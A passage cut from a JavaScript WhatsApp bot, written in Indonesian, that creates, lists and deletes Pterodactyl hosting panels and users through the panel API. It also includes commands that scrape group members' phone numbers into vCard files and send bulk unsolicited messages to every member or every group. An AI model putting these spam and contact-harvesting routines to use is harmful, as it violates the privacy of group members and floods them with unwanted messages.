description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return ReplyLanz("Server panel tidak ditemukan!")
ReplyLanz(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1024"
disknya = "1024"
cpu = "30"
} else if (command == "2gb") {
ram = "2048"
disknya = "2048"
cpu = "50"
} else if (command == "3gb") {
ram = "3072"
disknya = "3072"
cpu = "70"
} else if (command == "4gb") {
ram = "4048"
disknya = "4048"
cpu = "90"
} else if (command == "5gb") {
ram = "5120"
disknya = "5120"
cpu = "110"
} else if (command == "6gb") {
ram = "6144"
disknya = "6144"
cpu = "125"
} else if (command == "7gb") {
ram = "7168"
disknya = "7168"
cpu = "150"
} else if (command == "8gb") {
ram = "8192"
disknya = "8192"
cpu = "170"
} else if (command == "9gb") {
ram = "9216"
disknya = "9216"
cpu = "180"
} else if (command == "10gb") {
ram = "10240"
disknya = "10240"
cpu = "200"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyLanz(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return ReplyLanz(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyLanz("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 23 hari
* Claim garansi wajib membawa bukti TF & chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await Putzz.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadp5": {
if (!isCreator && !isPremium) return ReplyLanz(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return ReplyLanz("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Putzz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return ReplyLanz(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ReplyLanz("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await Putzz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json", 
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return ReplyLanz("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return ReplyLanz("Akun admin panel tidak ditemukan!")
await ReplyLanz(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return ReplyLanz(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ReplyLanz("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return ReplyLanz("Server panel tidak ditemukan!")
ReplyLanz(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "produk": case "listproduk": case "list": {
await Putzz.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Berikut adalah list produk\n"
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "savekontak": {
    if (!isOwner) return ReplyLanz(mess.owner)
    if (!text) return ReplyLanz(example("namakontak"))

    const meta = await Putzz.groupFetchAllParticipating()
    let dom = Object.keys(meta)
    global.textsavekontak = text // simpan nama kontak custom
    let list = []

    for (let i of dom) {
        list.push({
            title: meta[i].subject,
            id: `.ressavekontak ${i}`,
            description: `${meta[i].participants.length} Member`
        })
    }

    return Putzz.sendMessage(m.chat, {
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '📁 Pilih Grup' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Pilih Grup',
                        sections: [
                            {
                                title: 'List Grup Chat',
                                rows: list
                            }
                        ]
                    })
                }
            }
        ],
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        text: "Pilih Target Grup untuk *Save Kontak*\n",
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, ...(Array.isArray(global.owner) ? global.owner.map(v => v+"@s.whatsapp.net") : [global.owner+"@s.whatsapp.net"])]
        },
    }, { quoted: qlocPush })
}
break

case "ressavekontak": {
    if (!isOwner) return ReplyLanz("❌ Khusus Owner")
    if (!text) return ReplyLanz("⚠️ Masukkan id grup.\nContoh: .ressavekontak 123456@g.us")
    if (!global.textsavekontak) return ReplyLanz("⚠️ Tidak ada nama kontak tersimpan.")

    try {
        const idgc = text.trim()
        const namaKontak = global.textsavekontak
        const jidawal = m.chat
        const data = await Putzz.groupMetadata(idgc)

        const halls = data.participants
            .map(v => v.id || v.user)
            .filter(jid => jid && jid.endsWith("@s.whatsapp.net"))

        await ReplyLanz(`⏳ Memproses *savekontak* dari grup *${data.subject}* dengan ${halls.length} anggota...`)

        // simpan ke vcf dengan nomor urut
        const uniqueContacts = [...new Set(halls)]
        const vcardContent = uniqueContacts.map((contact, index) => {
            const nomor = contact.split("@")[0]
            return [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:${namaKontak} ${index+1}`,
                `TEL;type=CELL;type=VOICE;waid=${nomor}:+${nomor}`,
                "END:VCARD",
                ""
            ].join("\n")
        }).join("")

        fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")

        global.textsavekontak = null
        await Putzz.sendMessage(jidawal, { 
            document: fs.readFileSync("./library/database/contacts.vcf"),
            fileName: "contacts.vcf",
            caption: `✅ *Berhasil Save Kontak*\nTotal *${uniqueContacts.length}* kontak berhasil dibuat.`,
            mimetype: "text/vcard",
        }, { quoted: m })

        // reset file
        fs.writeFileSync("./library/database/contacts.vcf", "")

    } catch (err) {
        console.error(err)
        ReplyLanz("❌ Terjadi error saat save kontak.")
    }
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak2": {
if (!isOwner) return ReplyLanz(mess.owner)
if (!m.isGroup) return ReplyLanz(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
ReplyLanz(err.toString())
} finally {
if (m.chat !== m.sender) await ReplyLanz(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Putzz.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "pushkontak": {
    if (!isOwner) return ReplyLanz(mess.owner)
    if (!text) return ReplyLanz(example("pesannya"))

    const meta = await Putzz.groupFetchAllParticipating()
    let dom = Object.keys(meta)
    global.textpushkontak = text
    let list = []

    for (let i of dom) {
        list.push({
            title: meta[i].subject,
            id: `.respushkontak ${i}`,
            description: `${meta[i].participants.length} Member`
        })
    }

    return Putzz.sendMessage(m.chat, {
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '📢 Kirim Pushkontak' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Pilih Grup',
                        sections: [
                            {
                                title: 'List Grup Chat',
                                rows: list
                            }
                        ]
                    })
                }
            }
        ],
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        text: "Pilih Target Grup Pushkontak\n",
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, ...(Array.isArray(global.owner) ? global.owner.map(v => v+"@s.whatsapp.net") : [global.owner+"@s.whatsapp.net"])]
        },
    }, { quoted: qlocPush }) // ganti qlocPush -> m biar aman
}
break

case "respushkontak": {
    if (!isOwner) return ReplyLanz("❌ Khusus Owner")
    if (!text) return ReplyLanz("⚠️ Masukkan id grup.\nContoh: .respushkontak 123456@g.us")
    if (!global.textpushkontak) return ReplyLanz("⚠️ Tidak ada teks push tersimpan.")

    try {
        const idgc = text.trim()
        const teks = global.textpushkontak
        const jidawal = m.chat
        const data = await Putzz.groupMetadata(idgc)

        // ambil semua member
        const halls = data.participants
            .map(v => v.id || v.user) // fix disini
            .filter(jid => jid && jid.endsWith("@s.whatsapp.net"))

        await ReplyLanz(`⏳ Memproses *pushkontak* ke grup *${data.subject}* dengan ${halls.length} anggota...`)

        let sukses = 0
        for (let mem of halls) {
            if (mem !== botNumber && !(Array.isArray(global.owner) ? global.owner.includes(mem.split("@")[0]) : mem.split("@")[0] === global.owner)) {
                await Putzz.sendMessage(mem, { text: teks }, { quoted: m })
                await sleep(global.delayPushkontak || 2000)
                sukses++
            }
        }

        global.textpushkontak = null
        await Putzz.sendMessage(jidawal, { 
            text: `✅ *Berhasil Pushkontak*\nTotal terkirim: ${sukses}/${halls.length}` 
        }, { quoted: qlocPush })

    } catch (err) {
        console.error(err)
        ReplyLanz("❌ Terjadi error saat push kontak.")
    }
}
break
/*
case "pushkontak": {
if (!isOwner) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("pesannya"))
const meta = await Putzz.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlocPush}) 
}
break*/
case "res.pushkontakv2":
{
  if (!isCreator) return ReplyLanz(mess.only.owner);

  if (!q) return ReplyLanz(`Incorrect Usage Please Use Command Like This\n${prefix + command} idgc|text`);

  const [idgc, pesan] = q.split("|");
  if (!idgc || !pesan) return ReplyLanz("Format salah. Gunakan: .res.pushkontakv2 idgroup|pesan");

  ReplyLanz(mess.wait);

  const metadata2 = await Putzz.groupMetadata(idgc);
  const halss = metadata2.participants;

  for (let mem of halss) {
    Putzz.sendMessage(`${mem.id.split("@")[0]}@s.whatsapp.net`, {
      text: pesan,
      linkPreview: false // untuk menghindari error match()
    });
    await sleep(5000);
  }

  ReplyLanz(`Success`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/*
case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await Putzz.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await ReplyLanz(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await Putzz.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await Putzz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break*/

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return ReplyLanz(mess.owner)
if (!m.isGroup) return ReplyLanz(mess.group)
if (!text) return ReplyLanz(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Putzz.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await ReplyLanz(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await Putzz.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await Putzz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return ReplyLanz(mess.owner)
let allgrup = await Putzz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await ReplyLanz(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Putzz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return ReplyLanz(mess.owner)
let allgrup = await Putzz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await ReplyLanz(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Putzz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmgb": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!q) return ReplyLanz(example("teksnya"))
let allgrup = await Putzz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await ReplyLanz(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Putzz.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Putzz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm2": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!q) return ReplyLanz(example("teks dengan mengirim foto"))
if (!isImage) return ReplyLanz(example("teks dengan mengirim foto"))
const allgrup = await Putzz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Putzz.downloadAndSaveMediaMessage(qmsg)
await ReplyLanz(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Putzz.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Putzz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!q) return ReplyLanz(example("teks dengan mengirim foto"))
if (!isImage) return ReplyLanz(example("teks dengan mengirim foto"))
const allgrup = await Putzz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Putzz.downloadAndSaveMediaMessage(qmsg)
await ReplyLanz(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Putzz.sendMessage(i, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
